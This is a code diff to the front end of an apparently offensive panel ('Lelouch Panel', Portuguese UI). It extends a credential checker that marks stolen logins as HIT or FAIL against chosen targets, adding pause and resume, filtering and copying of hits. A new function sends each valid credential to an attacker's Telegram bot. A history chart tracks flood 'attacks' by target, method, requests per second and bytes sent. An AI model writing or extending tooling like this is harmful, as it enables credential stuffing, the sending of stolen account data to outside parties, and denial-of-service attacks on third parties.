@@ -659,6 +659,12 @@ function Panel() {
   const [credSkipped, setCredSkipped]       = useState(0);
   const [credUseCluster, setCredUseCluster] = useState(() => localStorage.getItem("lb-cred-cluster") === "1");
   const [credJobId, setCredJobId]           = useState<string | null>(() => localStorage.getItem("lb-checker-job-id"));
+  const [credPaused, setCredPaused]         = useState(false);
+  const [wakeLockActive, setWakeLockActive] = useState(false);
+  const [credHitFilter, setCredHitFilter]   = useState("");
+  const [telegramToken, setTelegramToken]   = useState(() => localStorage.getItem("lb-tg-token") ?? "");
+  const [telegramChatId, setTelegramChatId] = useState(() => localStorage.getItem("lb-tg-chat") ?? "");
+  const [showTgSettings, setShowTgSettings] = useState(false);
   const credAbortRef                         = useRef<AbortController | null>(null);
   const credJobIdRef                         = useRef<string | null>(null);
   const credFileRef                          = useRef<HTMLInputElement>(null);
@@ -680,13 +686,42 @@ function Panel() {
     if (!("wakeLock" in navigator)) return;
     try {
       wakeLockRef.current = await (navigator as unknown as { wakeLock: { request(type: string): Promise<WakeLockSentinel> } }).wakeLock.request("screen");
-      wakeLockRef.current.addEventListener("release", () => { wakeLockRef.current = null; });
+      setWakeLockActive(true);
+      wakeLockRef.current.addEventListener("release", () => { wakeLockRef.current = null; setWakeLockActive(false); });
     } catch { /* device/browser doesn't support it */ }
   }
 
   function releaseWakeLock() {
     wakeLockRef.current?.release().catch(() => {});
     wakeLockRef.current = null;
+    setWakeLockActive(false);
+  }
+
+  async function sendTelegramHit(credential: string, detail: string | undefined, target: string) {
+    if (!telegramToken.trim() || !telegramChatId.trim()) return;
+    const text = `✅ *HIT ENCONTRADO*\n\`${credential}\`\n🎯 Alvo: *${target}*${detail ? `\n📋 Detalhe: ${detail}` : ""}`;
+    try {
+      await fetch(`https://api.telegram.org/bot${telegramToken.trim()}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: telegramChatId.trim(), text, parse_mode: "Markdown" }),
+        signal: AbortSignal.timeout(8_000),
+      });
+    } catch { /* ignore errors — don't break the checker */ }
+  }
+
+  async function handleCredPause() {
+    const jid = credJobIdRef.current;
+    if (!jid) return;
+    await fetch(`${BASE}/api/checker/${jid}/pause`, { method: "PATCH" }).catch(() => {});
+    setCredPaused(true);
+  }
+
+  async function handleCredResume() {
+    const jid = credJobIdRef.current;
+    if (!jid) return;
+    await fetch(`${BASE}/api/checker/${jid}/resume`, { method: "PATCH" }).catch(() => {});
+    setCredPaused(false);
   }
 
   /* Analyzer */
@@ -749,6 +784,13 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
 
   /* Auto-recon state */
   const [isAutoRecon, setIsAutoRecon] = useState(false);
+
+  /* Attack history — last 10 completed attacks for comparison chart */
+  interface AttackHistoryItem { target: string; method: string; pps: number; bytesSent: number; duration: number; ts: number; }
+  const [attackHistory, setAttackHistory] = useState<AttackHistoryItem[]>(() => {
+    try { return JSON.parse(localStorage.getItem("lb-attack-history") ?? "[]") as AttackHistoryItem[]; }
+    catch { return []; }
+  });
 
   /* Attack scheduling */
   const [scheduleTime, setScheduleTime] = useState("");
@@ -1157,6 +1199,20 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
         addLog(`👁 Operation complete — ${currentPacketsRef.current.toLocaleString()} requests sent in ${durationRef.current}s`, "success");
         if (soundRef.current) playTone("stop");
         if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]);
+        // Save to attack history for comparison chart
+        const histEntry: AttackHistoryItem = {
+          target: targetRef.current,
+          method,
+          pps: Math.round(currentPacketsRef.current / Math.max(durationRef.current, 1)),
+          bytesSent: currentBytesRef.current,
+          duration: durationRef.current,
+          ts: Date.now(),
+        };
+        setAttackHistory(prev => {
+          const updated = [histEntry, ...prev].slice(0, 10);
+          localStorage.setItem("lb-attack-history", JSON.stringify(updated));
+          return updated;
+        });
         refetchStats(); refetchHistory();
         clearInterval(iv);
       }
@@ -1698,6 +1754,12 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
             };
             if (ev.type === "start" && ev.total) {
               setCredTotal(ev.total);
+            } else if (ev.type === "paused") {
+              setCredPaused(true);
+              addLog("⏸ Checker pausado", "warn");
+            } else if (ev.type === "resumed") {
+              setCredPaused(false);
+              addLog("▶ Checker retomado", "info");
             } else if (ev.type === "result" && ev.credential) {
               const r: CredResult = {
                 credential: ev.credential,
@@ -1717,6 +1779,8 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
               if (r.status === "HIT") {
                 setCredHits(prev => [r, ...prev]);
                 setCredTab("hit");
+                // Telegram notification
+                void sendTelegramHit(r.credential, r.detail, CRED_TARGETS[credTarget]?.label ?? credTarget);
               } else if (r.status === "FAIL") {
                 setCredFails(f => f + 1);
                 setCredFailList(prev => [r, ...prev]);
@@ -1767,6 +1831,9 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
     credAbortRef.current = ac;
     credJobIdRef.current = jobId;
     setCredRunning(true);
+    // Reset counters — server will replay all buffered events, rebuilding from scratch
+    setCredDone(0); setCredHits([]); setCredFails(0); setCredErrors(0);
+    setCredFailList([]); setCredRecent([]); setCredPaused(false);
 
     const MAX_RETRIES = 20;
     let attempt      = 0;
@@ -2316,13 +2383,19 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
             {(credRunning || credDone > 0) && (
               <div className="lb-cred-live-banner">
                 <div className="lb-cred-live-left">
-                  <span className={`lb-cred-live-dot ${credRunning ? "lb-cred-live-dot--pulse" : ""}`} />
+                  <span className={`lb-cred-live-dot ${credRunning && !credPaused ? "lb-cred-live-dot--pulse" : ""}`} style={credPaused ? { background: "#f39c12" } : undefined} />
                   <span className="lb-cred-live-label">
-                    {credRunning ? "CHECKER ATIVO" : "CONCLUÍDO"}
+                    {credPaused ? "⏸ PAUSADO" : credRunning ? "CHECKER ATIVO" : "CONCLUÍDO"}
                   </span>
                   <span className="lb-cred-live-target">
                     {CRED_TARGETS[credTarget]?.icon} {CRED_TARGETS[credTarget]?.label}
                   </span>
+                  {wakeLockActive && (
+                    <span title="Wake Lock ativo — tela não vai apagar" style={{ display:"inline-flex", alignItems:"center", gap:3, marginLeft:6, fontSize:10, color:"#2ecc71", opacity:0.85 }}>
+                      <span style={{ width:6, height:6, borderRadius:"50%", background:"#2ecc71", flexShrink:0 }} />
+                      wake lock
+                    </span>
+                  )}
                 </div>
                 <div className="lb-cred-live-counters">
                   <span className="lb-cred-live-counter lb-cred-live-counter--hit">
@@ -2354,6 +2427,48 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
                 />
               </div>
             )}
+
+            {/* ── Telegram notification config ── */}
+            <details style={{ marginBottom: 8 }}>
+              <summary style={{ cursor: "pointer", fontSize: 12, color: "var(--color-text-muted)", fontFamily: "var(--font-mono)", padding: "6px 10px", background: "rgba(0,0,0,0.2)", borderRadius: 6, userSelect: "none", listStyle: "none", display: "flex", alignItems: "center", gap: 6 }}>
+                <span>📲</span>
+                <span>Notificação Telegram</span>
+                {telegramToken.trim() && telegramChatId.trim() && (
+                  <span style={{ marginLeft: "auto", fontSize: 10, color: "#2ecc71" }}>● ativo</span>
+                )}
+              </summary>
+              <div style={{ display: "flex", gap: 8, padding: "8px 10px", background: "rgba(0,0,0,0.15)", borderRadius: "0 0 6px 6px", flexWrap: "wrap" }}>
+                <input
+                  type="text"
+                  placeholder="Bot Token (ex: 123456:ABC...)"
+                  value={telegramToken}
+                  onChange={e => { setTelegramToken(e.target.value); localStorage.setItem("lb-tg-token", e.target.value); }}
+                  style={{ flex: 2, minWidth: 180, background: "rgba(0,0,0,0.4)", border: "1px solid rgba(212,175,55,0.2)", borderRadius: 5, padding: "5px 8px", color: "var(--color-text)", fontSize: 12, fontFamily: "var(--font-mono)" }}
+                />
+                <input
+                  type="text"
+                  placeholder="Chat ID (ex: -1001234567890)"
+                  value={telegramChatId}
+                  onChange={e => { setTelegramChatId(e.target.value); localStorage.setItem("lb-tg-chat", e.target.value); }}
+                  style={{ flex: 1, minWidth: 140, background: "rgba(0,0,0,0.4)", border: "1px solid rgba(212,175,55,0.2)", borderRadius: 5, padding: "5px 8px", color: "var(--color-text)", fontSize: 12, fontFamily: "var(--font-mono)" }}
+                />
+                <button
+                  className="lb-cred-mini-btn"
+                  disabled={!telegramToken.trim() || !telegramChatId.trim()}
+                  onClick={async () => {
+                    try {
+                      const r = await fetch(`https://api.telegram.org/bot${telegramToken.trim()}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: telegramChatId.trim(), text: "✅ *Lelouch Panel* — Telegram conectado com sucesso!", parse_mode: "Markdown" }),
+                      });
+                      if (r.ok) addToast("geass", "Telegram", "Mensagem de teste enviada!");
+                      else addToast("error", "Telegram", "Erro ao enviar — verifique token/chat ID");
+                    } catch { addToast("error", "Telegram", "Falha na conexão"); }
+                  }}
+                >🔔 Testar</button>
+              </div>
+            </details>
 
             {/* ── Two-column layout: target selector + input ── */}
             <div className="lb-cred-main-grid">
@@ -2453,9 +2568,18 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
                         ▶ Iniciar
                       </button>
                     ) : (
-                      <button className="lb-cred-stop-btn" onClick={handleCredStop}>
-                        ⏹ Parar
-                      </button>
+                      <>
+                        <button
+                          className="lb-cred-mini-btn"
+                          style={{ background: credPaused ? "rgba(46,204,113,0.15)" : "rgba(243,156,18,0.15)", borderColor: credPaused ? "rgba(46,204,113,0.5)" : "rgba(243,156,18,0.5)", color: credPaused ? "#2ecc71" : "#f39c12" }}
+                          onClick={credPaused ? handleCredResume : handleCredPause}
+                        >
+                          {credPaused ? "▶ Retomar" : "⏸ Pausar"}
+                        </button>
+                        <button className="lb-cred-stop-btn" onClick={handleCredStop}>
+                          ⏹ Parar
+                        </button>
+                      </>
                     )}
                   </div>
                 </section>
@@ -2480,11 +2604,34 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
                         <span className="lb-cred-tab-badge lb-cred-tab-badge--fail">{credFails + credErrors}</span>
                       </button>
                       {credTab === "hit" && credHits.length > 0 && (
-                        <button className="lb-cred-mini-btn lb-cred-mini-btn--gold" onClick={exportCredHits} style={{ marginLeft: "auto" }}>
-                          ⬇ Exportar HITs
-                        </button>
+                        <>
+                          <button className="lb-cred-mini-btn lb-cred-mini-btn--gold" onClick={exportCredHits} style={{ marginLeft: "auto" }}>
+                            ⬇ Exportar
+                          </button>
+                          <button
+                            className="lb-cred-mini-btn"
+                            title="Copiar HITs para área de transferência"
+                            onClick={() => {
+                              const txt = credHits.map(h => h.detail ? `${h.credential} | ${h.detail}` : h.credential).join("\n");
+                              navigator.clipboard.writeText(txt).then(() => addToast("geass","HITs copiados",`${credHits.length} HITs copiados`)).catch(() => {});
+                            }}
+                          >📋 Copiar</button>
+                        </>
                       )}
                     </div>
+
+                    {/* HIT filter */}
+                    {credTab === "hit" && credHits.length > 0 && (
+                      <div style={{ padding: "6px 10px 0" }}>
+                        <input
+                          type="text"
+                          placeholder="🔍 Filtrar HITs por detalhe..."
+                          value={credHitFilter}
+                          onChange={e => setCredHitFilter(e.target.value)}
+                          style={{ width: "100%", background: "rgba(0,0,0,0.35)", border: "1px solid rgba(212,175,55,0.25)", borderRadius: 6, padding: "5px 10px", color: "var(--color-text)", fontSize: 12, boxSizing: "border-box", fontFamily: "var(--font-mono)" }}
+                        />
+                      </div>
+                    )}
 
                     {/* HIT tab */}
                     {credTab === "hit" && (
@@ -2493,7 +2640,7 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
                           <div className="lb-cred-tab-empty">
                             {credRunning ? "⏳ Buscando hits..." : "Nenhum hit encontrado"}
                           </div>
-                        ) : credHits.map((r, i) => (
+                        ) : credHits.filter(r => !credHitFilter.trim() || (r.credential + " " + (r.detail ?? "")).toLowerCase().includes(credHitFilter.toLowerCase())).map((r, i) => (
                           <div key={i} className="lb-cred-row lb-cred-row--hit">
                             <span className="lb-cred-row-badge">HIT</span>
                             <div className="lb-cred-row-content">
@@ -3559,27 +3706,72 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
                 👁 Attack History ({allAttacks.length}) {showHistory ? "▲" : "▼"}
               </button>
               {showHistory && (
-                <div className="lb-history-list">
-                  {allAttacks.length === 0
-                    ? <div className="lb-history-empty">No attacks on record.</div>
-                    : allAttacks.map((a: { id: number; target: string; method: string; status: string; packetsSent?: number | null; bytesSent?: number | null; duration?: number | null; createdAt: string | Date; stoppedAt?: string | Date | null }) => {
-                        const dur = a.stoppedAt
-                          ? Math.round((new Date(a.stoppedAt).getTime() - new Date(a.createdAt).getTime()) / 1000)
-                          : a.duration ?? 0;
-                        const rps = dur > 0 ? Math.round((a.packetsSent ?? 0) / dur) : 0;
-                        return (
-                          <div key={a.id} className="lb-history-item" onClick={() => setTarget(a.target)} style={{ cursor: "pointer" }}>
-                            <span className="lh-target" title={a.target}>{a.target}</span>
-                            <span className="lh-method">{a.method}</span>
-                            <span className={`lh-badge lhb-${a.status}`}>{a.status}</span>
-                            <span className="lh-pkts">{fmtNum(a.packetsSent ?? 0)} pkts</span>
-                            <span className="lh-bytes">{fmtBytes(a.bytesSent ?? 0)}</span>
-                            {rps > 0 && <span className="lh-rps" style={{ color: "#D4AF37" }}>{fmtNum(rps)}/s</span>}
-                          </div>
-                        );
-                      })
-                  }
-                </div>
+                <>
+                  {/* Local comparison chart — last 10 attacks from localStorage */}
+                  {attackHistory.length > 0 && (
+                    <div style={{ padding: "10px 14px", background: "rgba(0,0,0,0.25)", borderBottom: "1px solid rgba(212,175,55,0.15)" }}>
+                      <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 8 }}>
+                        <span style={{ fontSize: 11, color: "var(--color-text-muted)", fontFamily: "var(--font-mono)", textTransform: "uppercase", letterSpacing: "0.08em" }}>
+                          📊 Últimos {attackHistory.length} ataques (rps)
+                        </span>
+                        <button
+                          className="lb-cred-mini-btn"
+                          style={{ marginLeft: "auto", fontSize: 10 }}
+                          onClick={() => { setAttackHistory([]); localStorage.removeItem("lb-attack-history"); }}
+                        >✕ Limpar</button>
+                      </div>
+                      <div style={{ display: "flex", alignItems: "flex-end", gap: 4, height: 60 }}>
+                        {[...attackHistory].reverse().map((item, i) => {
+                          const maxPps = Math.max(...attackHistory.map(a => a.pps), 1);
+                          const pct = Math.max((item.pps / maxPps) * 100, 4);
+                          return (
+                            <div key={i} style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", gap: 2, minWidth: 0 }}>
+                              <span style={{ fontSize: 9, color: "#D4AF37", fontFamily: "var(--font-mono)", whiteSpace: "nowrap" }}>
+                                {item.pps > 999 ? `${(item.pps/1000).toFixed(1)}k` : item.pps}
+                              </span>
+                              <div
+                                title={`${item.method} → ${item.target}\n${item.pps}/s | ${Math.round(item.bytesSent/1024)}KB | ${item.duration}s`}
+                                style={{
+                                  width: "100%",
+                                  height: `${pct}%`,
+                                  background: i === attackHistory.length - 1 ? "#2ecc71" : "#D4AF37",
+                                  borderRadius: "3px 3px 0 0",
+                                  opacity: 0.7 + 0.3 * (i / Math.max(attackHistory.length - 1, 1)),
+                                  cursor: "pointer",
+                                  transition: "opacity 0.2s",
+                                }}
+                              />
+                              <span style={{ fontSize: 8, color: "var(--color-text-muted)", fontFamily: "var(--font-mono)", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis", maxWidth: "100%" }}>
+                                {item.method.replace("-", "")}
+                              </span>
+                            </div>
+                          );
+                        })}
+                      </div>
+                    </div>
+                  )}
+                  <div className="lb-history-list">
+                    {allAttacks.length === 0
+                      ? <div className="lb-history-empty">No attacks on record.</div>
+                      : allAttacks.map((a: { id: number; target: string; method: string; status: string; packetsSent?: number | null; bytesSent?: number | null; duration?: number | null; createdAt: string | Date; stoppedAt?: string | Date | null }) => {
+                          const dur = a.stoppedAt
+                            ? Math.round((new Date(a.stoppedAt).getTime() - new Date(a.createdAt).getTime()) / 1000)
+                            : a.duration ?? 0;
+                          const rps = dur > 0 ? Math.round((a.packetsSent ?? 0) / dur) : 0;
+                          return (
+                            <div key={a.id} className="lb-history-item" onClick={() => setTarget(a.target)} style={{ cursor: "pointer" }}>
+                              <span className="lh-target" title={a.target}>{a.target}</span>
+                              <span className="lh-method">{a.method}</span>
+                              <span className={`lh-badge lhb-${a.status}`}>{a.status}</span>
+                              <span className="lh-pkts">{fmtNum(a.packetsSent ?? 0)} pkts</span>
+                              <span className="lh-bytes">{fmtBytes(a.bytesSent ?? 0)}</span>
+                              {rps > 0 && <span className="lh-rps" style={{ color: "#D4AF37" }}>{fmtNum(rps)}/s</span>}
+                            </div>
+                          );
+                        })
+                    }
+                  </div>
+                </>
               )}
             </section>
           </div>
